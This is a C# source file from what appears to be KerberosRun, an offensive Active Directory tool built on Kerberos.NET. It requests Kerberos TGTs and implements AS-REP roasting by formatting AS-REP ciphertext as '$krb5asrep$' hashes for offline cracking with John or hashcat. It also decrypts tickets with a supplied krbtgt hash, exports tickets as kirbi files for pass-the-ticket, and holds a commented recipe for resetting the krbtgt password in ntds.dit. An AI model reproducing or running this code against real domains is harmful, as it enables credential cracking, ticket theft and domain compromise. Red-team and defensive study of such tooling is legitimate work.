using System;
using Kerberos.NET.Client;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using System.Threading;
using Kerberos.NET.Transport;
using Kerberos.NET;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NLog;

namespace KerberosRun
{
    public class TGT
    {
        private readonly DateTime now;
        private readonly TcpKerberosTransport transport;
        internal KerberosCredential cred;
        private KrbAsReq asReqMessage;
        private KrbAsRep asRep;
        private KrbEncAsRepPart asDecryptedRepPart;
        internal KrbEncryptionKey sessionKey;
        internal KrbTicket Ticket;
        private byte[] kirbiTGT;
        AuthenticationOptions authOptions = AuthenticationOptions.RenewableOk |
                                            AuthenticationOptions.Canonicalize |
                                            AuthenticationOptions.Renewable |
                                            AuthenticationOptions.Forwardable |
                                            AuthenticationOptions.RepPartCompatible;
        Logger logger;

        public TGT()
        {
            logger = LogManager.GetCurrentClassLogger();
            now = DateTime.Now;
            transport = new TcpKerberosTransport(null);

            cred = Helper.GetCredFromOption();

            if (!Options.Instance.NoPAC) { authOptions |= AuthenticationOptions.IncludePacRequest; }
        }


        public void CreateASReq()
        {
            var kdcOptions = (KdcOptions)(authOptions & ~AuthenticationOptions.AllAuthentication);

            var hostAddress = Environment.MachineName;

            var pacRequest = new KrbPaPacRequest
            {
                IncludePac = authOptions.HasFlag(AuthenticationOptions.IncludePacRequest)
            };

            var padata = new List<KrbPaData>()
                    {
                        new KrbPaData
                        {
                            Type = PaDataType.PA_PAC_REQUEST,
                            Value = pacRequest.Encode()
                        }
                    };


            asReqMessage = new KrbAsReq()
            {
                Body = new KrbKdcReqBody
                {
                    Addresses = new[]
                    {
                                new KrbHostAddress
                                {
                                    AddressType = AddressType.NetBios,
                                    Address = Encoding.ASCII.GetBytes(hostAddress.PadRight(16, ' '))
                                }
                            },
                    CName = new KrbPrincipalName()
                    {
                        Type = PrincipalNameType.NT_PRINCIPAL,
                        Name = new[] { Options.Instance.User }// + "@" + domainName.ToUpper() }
                    },
                    //KrbPrincipalName.FromString(
                    //    username,
                    //   PrincipalNameType.NT_ENTERPRISE,
                    //    domainName
                    //),
                    EType = KrbConstants.KerberosConstants.ETypes.ToArray(),//kdcReqEtype, 
                    KdcOptions = kdcOptions,
                    Nonce = KrbConstants.KerberosConstants.GetNonce(),
                    RTime = KrbConstants.KerberosConstants.EndOfTime,
                    Realm = cred.Domain,
                    SName = new KrbPrincipalName
                    {
                        Type = PrincipalNameType.NT_SRV_INST,
                        Name = new[] { "krbtgt", cred.Domain }
                    },
                    Till = KrbConstants.KerberosConstants.EndOfTime,
                    AdditionalTickets = null,
                    EncAuthorizationData = null
                },
                PaData = padata.ToArray()
            };

            if (authOptions.HasFlag(AuthenticationOptions.PreAuthenticate))
            {
                var ts = new KrbPaEncTsEnc()
                {
                    PaTimestamp = now,
                    PaUSec = now.Millisecond,
                };

                var tsEncoded = ts.Encode();

                var padataAs = asReqMessage.PaData.ToList();

                KrbEncryptedData encData = KrbEncryptedData.Encrypt(
                    tsEncoded,
                    cred.CreateKey(),
                    KeyUsage.PaEncTs
                );

                padataAs.Add(new KrbPaData
                {
                    Type = PaDataType.PA_ENC_TIMESTAMP,
                    Value = encData.Encode()
                });

                asReqMessage.PaData = padataAs.ToArray();
            }
        }



        public async Task<KrbAsRep> AskTGT()
        {
            logger.Info("[*] Starting Kerberos Authentication ...");
            //Pre-Auth
            bool notPreauth = true;

            while (notPreauth)
            {
                try
                {
                    logger.Info("[*] Sending AS-REQ ...");

                    CreateASReq();

                    var asReq = asReqMessage.EncodeApplication();

                    logger.Info("[*] Receiving AS-REP...");
                    asRep = await transport.SendMessage<KrbAsRep>(
                        Options.Instance.Domain,
                        asReq,
                        default);

                }
                catch (KerberosProtocolException pex)
                {
                    logger.Info("[x] {0}", pex.Message);

                    if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED)
                    {
                        if (Options.Instance.Asreproast)
                        {
                            logger.Error("[x] Sorry the provided user requires PreAuth.\n");
                        }
                        else
                        {
                            //Salt issue for RID 500 Built-in admin account
                            //https://github.com/dotnet/Kerberos.NET/issues/164
                            cred.IncludePreAuthenticationHints(pex?.Error?.DecodePreAuthentication());
                            authOptions |= AuthenticationOptions.PreAuthenticate;
                            logger.Info("[*] Adding encrypted timestamp ...");
                            continue;
                        }

                    }
                    else if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_FAILED)
                    {
                        logger.Error("[x] Invalid Credential! Authentication Stopped ...\n");
                    }
                    else
                    {
                        logger.Error("[x] Authentication Stopped ...\n");
                    }
                    Environment.Exit(0);
                }
                notPreauth = false;
            }


            Ticket = asRep.Ticket;
            asDecryptedRepPart = cred.DecryptKdcRep(
                           asRep,
                           KeyUsage.EncAsRepPart,
                           d => KrbEncAsRepPart.DecodeApplication(d));
            sessionKey = asDecryptedRepPart.Key;
            kirbiTGT = Kirbi.GetKirbi(asRep, asDecryptedRepPart, Options.Instance.PTT);

            return asRep;
        }



        public string ASRepRoast()
        {
            string repHash = BitConverter.ToString(asRep.EncPart.Cipher.ToArray()).Replace("-", string.Empty);
            repHash = repHash.Insert(32, "$");

            string hashString = string.Empty;
            if (Options.Instance.Format == "john")
            {
                hashString = string.Format("$krb5asrep${0}@{1}:{2}", Options.Instance.User, Options.Instance.Domain, repHash);
            }
            else
            {
                hashString = string.Format("$krb5asrep$23${0}@{1}:{2}", Options.Instance.User, Options.Instance.Domain, repHash);
            }
            return hashString;
        }



        public void DisplayTGT()
        {
            if (!Options.Instance.Verbose) { return; }
            //AS-Req Part
            logger.Info("[*] AS-REQ");
            Display.PrintReq(asReqMessage, cred.CreateKey());

            //AS-Rep Part
            logger.Info("[*] AS-REP");
            Display.PrintRep(asRep, cred.CreateKey());


            if (authOptions.HasFlag(AuthenticationOptions.PreAuthenticate))
            {
                Console.WriteLine("    * [Decrypted Enc-Part]:");

                Display.PrintRepEnc(asDecryptedRepPart, cred.CreateKey());



                //Decrypt TGT
                /*
                net stop ntds
                $key = Get - BootKey - Online
                $cred = ConvertTo - SecureString - String "krbtgt" - AsPlainText - Force
                Set - ADDBAccountPassword - SamAccountName krbtgt - NewPassword $cred - DatabasePath C:\Windows\NTDS\ntds.dit - BootKey $key
                       net start ntds

                KeyTable keytab = new KeyTable(System.IO.File.ReadAllBytes("C:\\Users\\Public\\krbtgt.keytab"));
                var krbtgtkey = keytab.GetKey(EncryptionType.AES256_CTS_HMAC_SHA1_96, asRep.Ticket.SName);
                */

                if (!string.IsNullOrEmpty(Options.Instance.DecryptTGT))
                {
                    var krbtgtCred = new KerberosHashCreds("krbtgt", Options.Instance.DecryptTGT, KerberosRun.decryptEtype);

                    //TGS - REQ Ticket Enc-Part
                    var ticketDecrypted = asRep.Ticket.EncryptedPart.Decrypt
                        (krbtgtCred.CreateKey(),
                        KeyUsage.Ticket,
                        b => KrbEncTicketPart.DecodeApplication(b));
                    Console.WriteLine("   * [Decrypted TGT]:");
                    Display.PrintTicketEnc(ticketDecrypted);
                    //Encrypt the ticket again
                    asRep.Ticket.EncryptedPart = KrbEncryptedData.Encrypt(ticketDecrypted.EncodeApplication(),
                        krbtgtCred.CreateKey(), KeyUsage.Ticket);
                }
            }

        }

        public string ToKirbi()
        {
            return Convert.ToBase64String(kirbiTGT);
        }

        public void ToFile()
        {
            Utils.WriteBytesToFile(Utils.MakeTicketFileName(Options.Instance.User), kirbiTGT);
        }

    }
}
